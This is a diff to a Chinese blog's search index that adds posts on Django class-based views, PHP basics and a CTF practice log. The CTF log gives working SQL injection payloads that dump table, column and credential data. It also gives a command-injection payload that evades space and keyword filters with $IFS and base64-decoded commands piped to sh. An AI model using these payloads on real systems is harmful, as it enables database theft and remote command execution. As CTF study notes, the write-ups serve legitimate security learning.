@@ -4,11 +4,53 @@
   
     
     <entry>
+      <title>django-CBV源码</title>
+      <link href="2021/02/20/django-cbv-yuan-ma/"/>
+      <url>2021/02/20/django-cbv-yuan-ma/</url>
+      
+        <content type="html"><![CDATA[<p>把views.py里面的add_press函数改为类:</p><pre><code>def add_press(request):    if request.method == 'POST':        press_name = request.POST.get('name')        Press.objects.create(name=press_name)        return redirect('/press_list/')    return render(request, "add_press.html")</code></pre><p>如下:</p><pre><code>class AddPress(View):    http_method_names = ['get', 'post']    def get(self, request):        print('get')        print(self.request)        return render(request, "add_press.html")    def post(self, request):        print('post')        press_name = request.POST.get('name')        Press.objects.create(name=press_name)        return redirect('/press_list/')</code></pre><p>同时urls.py里面改为:</p><pre><code>path(r'add_press/',views.AddPress.as_view()),</code></pre><p>按shift+左键进入as_view()<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-02-20_18-11-08.jpg"><br>发现as_view()的返回值是view也是函数<br>as_view里面的形参cls是AddPress类,执行view,self是AddPress的一个对象</p><blockquote><p>　1. hasattr(object, name):判断object对象中是否存在name属性，当然对于python的对象而言，属性包含变量和方法；有则返回True，没有则返回False；需要注意的是name参数是string类型，所以不管是要判断变量还是方法，其名称都以字符串形式传参；<br>print(self.head(request))</p></blockquote><pre><code>&lt;HttpResponse status_code=200, "text/html; charset=utf-8"&gt;</code></pre><p><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-02-20_20-33-18.jpg"></p><blockquote><p>getattr(object,name,default):作用：返回object的名称为name的属性的属性值，如果属性name存在，则直接返回其属性值；如果属性name不存在，则触发AttribetError异常或当可选参数default定义时返回default值。<br>dispatch函数判断请求方法是否被允许,如果允许,取到自己类里面定义的get和post方法,最后返回handler的执行结果,返回HttpResponse对象</p></blockquote>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 开发 </tag>
+            
+            <tag> django </tag>
+            
+            <tag> python </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php代码审计第一天</title>
+      <link href="2021/01/27/php-dai-ma-shen-ji-di-yi-tian/"/>
+      <url>2021/01/27/php-dai-ma-shen-ji-di-yi-tian/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-注释和变量"><a href="#1-注释和变量" class="headerlink" title="1.注释和变量"></a>1.注释和变量</h3><p>1.注释<br>//单行<br>/**/多行<br>2.变量<br>变量是以$符号开头<br>变量区分大小写</p><h4 id="isset-函数"><a href="#isset-函数" class="headerlink" title="isset()函数"></a>isset()函数</h4><p>判断变量是否为空<br>为空则返回NULL,不为空返回1</p><h4 id="var-dump函数"><a href="#var-dump函数" class="headerlink" title="var_dump函数"></a>var_dump函数</h4><p>输出变量的类型,数组也可以</p><pre><code>&lt;?php    $a=-1;    $b="51cto.com";    $c=array(1,2,3);    var_dump($c);    var_dump($a);    var_dump($b);</code></pre><p><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-28_10-51-42.jpg"></p><h4 id="gettype函数"><a href="#gettype函数" class="headerlink" title="gettype函数"></a>gettype函数</h4><pre><code>&lt;?php    $a=-1;    $b="51cto.com";    $c=array(1,2,3);    echo gettype($a);    echo "\n";    echo gettype($b);    echo "\n";    echo gettype($c);</code></pre><p><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-28_10-54-07.jpg"><br>== === != !==的区别<br>三元运算符<br>$a=12<br>$b=13<br>echo $a&gt;$b?”Hello”:”go”<br>逻辑运算符:<br>&amp;&amp; || !<br>(a)&amp;&amp;(b)<br>(a)||(b)<br>字符串运算符<br>点.</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>2020.01.26刷题记录</title>
       <link href="2021/01/26/2020-01-26-shua-ti-ji-lu/"/>
       <url>2021/01/26/2020-01-26-shua-ti-ji-lu/</url>
       
-        <content type="html"><![CDATA[<h3 id="1-Web"><a href="#1-Web" class="headerlink" title="1.Web"></a>1.Web</h3><h4 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h4><p>题目:<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-15-03.jpg"><br>1.发现单引号报错,双引号不报错,所以为单引号<br>2.试试万能钥匙1’or 1=1 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-18-01.jpg"><br>试了各种密码,解不出来,于是回归到sql注入<br>3.1’order by 3 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-19-51.jpg"><br>发现字段为3<br>4.1’union select 1,2,3 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-21-02.jpg"><br>2,3位置有回显<br>5.1’union select 1,version(),database() #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-22-23.jpg"><br>6. 爆表名<br>1’union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-25-18.jpg"><br>7.爆l0ve1ysq1的字段名<br>1’union select 1,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’#<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-34-36.jpg"><br>8.爆数据<br>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1# //l0ve1ysq1没有单引号<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-38-19.jpg"></p>]]></content>
+        <content type="html"><![CDATA[<h3 id="1-Web"><a href="#1-Web" class="headerlink" title="1.Web"></a>1.Web</h3><h4 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h4><p>题目:<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-15-03.jpg"><br>1.发现单引号报错,双引号不报错,所以为单引号<br>2.试试万能钥匙1’or 1=1 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-18-01.jpg"><br>试了各种密码,解不出来,于是回归到sql注入<br>3.1’order by 3 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-19-51.jpg"><br>发现字段为3<br>4.1’union select 1,2,3 #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-21-02.jpg"><br>2,3位置有回显<br>5.1’union select 1,version(),database() #<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-22-23.jpg"><br>6. 爆表名<br>1’union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-25-18.jpg"><br>7.爆l0ve1ysq1的字段名<br>1’union select 1,group_concat(column_name) from information_schema.columns where table_name=’l0ve1ysq1’#<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-34-36.jpg"><br>8.爆数据<br>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1# //l0ve1ysq1没有单引号<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_10-38-19.jpg"></p><h4 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h4><p>题目:<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-30-56.jpg"><br>1.试试?ip=127.0.0.1<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-32-09.jpg"><br>应该是命令执行漏洞<br>2.试试?ip=127.0.0.1;ls<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-33-21.jpg"><br>3.?ip=127.0.0.1;cat flag.php<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-34-23.jpg"><br>可知过滤了空格<br>4.用${IFS}$代替空格<br>?ip=127.0.0.1;cat${IFS}$flag.php<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-36-03.jpg"><br>可能过滤了{}<br>5.用$IFS$1来代替<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-37-20.jpg"><br>应该是过滤了flag的字眼<br>6.?ip=127.0.0.1;cat$IFS$1index.php<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-38-23.jpg"><br>发现过滤了bash,flag,空格等,sh没有被过滤<br>7.<br>payload:</p><pre><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p>Y2F0IGZsYWcucGhw是cat flag.php的base64形式<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2021-01-26_17-42-22.jpg"><br>命令执行漏洞总结的比较好的文章:<a href="https://www.ghtwf01.cn/index.php/archives/273/" title="https://www.ghtwf01.cn/index.php/archives/273/">https://www.ghtwf01.cn/index.php/archives/273/</a></p><h4 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h4><p>rornado模板注入</p>]]></content>
       
       
       <categories>
